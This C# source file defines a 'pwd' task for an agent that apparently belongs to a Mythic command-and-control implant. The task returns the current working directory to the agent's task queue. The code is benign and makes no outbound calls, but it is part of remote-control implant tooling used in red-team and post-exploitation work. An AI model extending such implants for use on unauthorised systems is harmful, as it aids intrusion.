﻿#define COMMAND_NAME_UPPER

#if DEBUG
#define PWD
#endif

#if PWD

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using NotpolloInterop.Classes;
using NotpolloInterop.Interfaces;
using NotpolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using NotpolloInterop.Serializers;
using System.Threading;

namespace Tasks
{
    public class pwd : Tasking
    {
        public pwd(IAgent agent, Task task) : base(agent, task)
        {

        }

        public override void Kill()
        {
            throw new NotImplementedException();
        }

        public override void Start()
        {
            TaskResponse resp = CreateTaskResponse(
                $"{System.IO.Directory.GetCurrentDirectory().ToString()}",
                true,
                "completed");
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}
#endif
